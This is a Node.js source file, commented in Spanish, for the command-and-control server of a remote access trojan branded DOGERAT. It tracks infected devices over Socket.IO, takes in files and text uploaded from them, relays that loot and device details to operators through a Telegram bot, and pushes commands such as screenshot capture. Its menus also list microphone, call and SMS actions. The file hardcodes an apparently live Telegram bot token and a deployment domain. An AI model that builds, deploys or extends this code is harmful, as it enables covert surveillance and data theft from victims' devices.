// RAT C2 Server - Versión Hardcoded (Credenciales directas)
// ESTE ARCHIVO CONTIENE CREDENCIALES SENSIBLES. NO COMPARTIR PÚBLICAMENTE.

// Dependencias
const express = require('express'),
    http = require('http'),
    { Server } = require('socket.io'),
    TelegramBot = require('node-telegram-bot-api'),
    fs = require('fs'),
    multer = require('multer');

// ==================================================================
// 🚨 --- ZONA DE CONFIGURACIÓN MANUAL (HARDCODED) --- 🚨
// ==================================================================

// 1. PEGA TU TOKEN DE TELEGRAM AQUÍ (Mantén las comillas)
// Ejemplo: const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh...";
const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; 

// 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
// Ejemplo: const MANUAL_DOMAIN = "https://mi-proyecto.up.railway.app";
const MANUAL_DOMAIN = "ratserver-production-96a6.up.railway.app";

// ==================================================================
// ------------------------------------------------------------------

// --- Diagnóstico de Inicio ---
console.log("=== INICIANDO SERVIDOR CON CREDENCIALES MANUALES ===");
console.log("Token configurado (longitud):", MANUAL_TOKEN.length);
console.log("Dominio configurado:", MANUAL_DOMAIN);

// Validación básica para evitar el crash si se te olvida poner el token
if (MANUAL_TOKEN === "PEGAR_TU_TOKEN_AQUI" || MANUAL_TOKEN.length < 20) {
    console.error("❌ ERROR FATAL: No has reemplazado el token en el código.");
    console.error("Edita server.js y pon tu token real en la variable MANUAL_TOKEN.");
    process.exit(1); // Detener ejecución para no saturar logs
}

// --- Configuración de Sistema de Archivos ---
const DATA_FILE = './data.json';
const FILE_DIR = 'file';

if (!fs.existsSync(FILE_DIR)) {
    try { fs.mkdirSync(FILE_DIR); } catch (e) { console.error("Error creando directorio file:", e); }
}

if (!fs.existsSync(DATA_FILE)) {
    try { fs.writeFileSync(DATA_FILE, '[]', 'utf8'); } catch (e) { console.error("Error creando data.json:", e); }
}

// --- Inicialización del Bot ---
// Usamos la variable manual directamente. Se aplica trim() por seguridad.
const bot = new TelegramBot(MANUAL_TOKEN.trim(), {
    polling: true
});

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Middleware para JSON
app.use(express.json()); 
app.use(express.static('HTML'));

// --- Almacenamiento ---
const connectedDevices = new Map();
const currentActions = new Map();

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, FILE_DIR),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage: storage });

// --- Rutas HTTP (Uploads y Texto) ---

app.post('/upload', upload.single('file'), (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, 
            `<b>✯ Archivo Recibido ✯</b>\n\nDispositivo: ${connectedDevices.get(deviceId).model}\nArchivo: ${req.file.originalname}\nURL: ${MANUAL_DOMAIN}/file/${req.file.filename}`, 
            { parse_mode: 'HTML' }
        );
    }
    res.send('Done');
});

app.post('/text', (req, res) => {
    const deviceId = req.headers['currentTarget'];
    if (deviceId && connectedDevices.get(deviceId)) {
        bot.sendMessage(connectedDevices.get(deviceId).chatId, 
            `<b>✯ Datos Recibidos ✯</b>\n\nDispositivo: ${connectedDevices.get(deviceId).model}\n\n${req.body.text}`, 
            { parse_mode: 'HTML' }
        );
    }
    res.send('Done');
});

// --- Lógica Socket.IO (Conexión de dispositivos) ---

io.on('connection', socket => {
    const headers = socket.handshake.headers;
    const deviceId = headers['currentTarget'];
    const model = headers['model'];
    
    // Debug en logs de Railway para ver si entra conexión
    console.log(`[Socket] Nueva conexión entrante. ID: ${deviceId}, Modelo: ${model}`);

    if (deviceId && !connectedDevices.get(deviceId)) {
        connectedDevices.set(deviceId, {
            socket: socket,
            model: model,
            version: headers['version'],
            time: headers['time'],
            ip: headers['host'],
            currentAction: 'no information',
            chatId: '' // Se llenará con los IDs de data.json
        });

        // Notificar a todos los admins registrados en data.json
        try {
            const admins = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            admins.forEach(chatId => {
                connectedDevices.get(deviceId).chatId = chatId;
                bot.sendMessage(chatId, 
                    `<b>✯ Nuevo Dispositivo Conectado ✯</b>\n\nModelo: ${model}\nIP: ${headers['host']}\nID: ${deviceId}`, 
                    { parse_mode: 'HTML' }
                );
            });
        } catch (e) {
            console.log('Error notificando admins:', e);
        }
    }

    socket.on('disconnect', () => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, `<b>✯ Dispositivo Desconectado ✯</b>\nModelo: ${device.model}`, { parse_mode: 'HTML' });
            connectedDevices.delete(deviceId);
        }
    });

    socket.on('commend', data => {
        const device = connectedDevices.get(deviceId);
        if (device) {
            bot.sendMessage(device.chatId, `<b>Respuesta del Dispositivo:</b>\n${data}`, { parse_mode: 'HTML' });
            device.currentAction = 'no information';
        }
    });
});

// --- Lógica del Bot de Telegram ---

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return;

    // Gestión de Admins (Auto-registro al enviar cualquier mensaje)
    let admins = [];
    try {
        admins = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (e) { admins = []; }

    if (!admins.includes(chatId)) {
        admins.push(chatId);
        fs.writeFileSync(DATA_FILE, JSON.stringify(admins), 'utf8');
        console.log(`[Admin] Nuevo admin registrado: ${chatId}`);
    }

    // Comandos Básicos
    if (text === '/start' || text.includes('Main menu')) {
        const deviceCount = connectedDevices.size;
        bot.sendMessage(chatId, 
            `<b>✯ DOGERAT C2 ONLINE ✯</b>\n\nDispositivos Conectados: ${deviceCount}\nDominio: ${MANUAL_DOMAIN}`, 
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    } 
    // Lógica para listar dispositivos
    else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        if (connectedDevices.size > 0) {
            let deviceList = [];
            connectedDevices.forEach((device, id) => {
                deviceList.push([device.model]); // Usar solo nombre para simplificar botón
            });
            deviceList.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
            
            bot.sendMessage(chatId, '<b>✯ Selecciona un dispositivo ✯</b>', {
                parse_mode: 'HTML',
                reply_markup: { keyboard: deviceList, resize_keyboard: true }
            });
        } else {
            bot.sendMessage(chatId, '<b>No hay dispositivos conectados.</b>', { parse_mode: 'HTML' });
        }
    }
    // Lógica para menú de acciones
    else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
        bot.sendMessage(chatId, '<b>✯ Panel de Control ✯</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
                    ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
                    ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                ],
                resize_keyboard: true
            }
        });
    }
    // Lógica simplificada de envío de comandos
    else if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
        // Enviar a todos o al seleccionado (simplificado a todos para prueba)
        connectedDevices.forEach((device, id) => {
            device.socket.emit('commend', 'screenshot'); // El comando raw que espera el RAT
            bot.sendMessage(chatId, `Comando enviado a ${device.model}`);
        });
    }
});

// Inicialización del Servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor escuchando en puerto ${PORT}`);
    console.log(`Esperando conexiones...`);
});
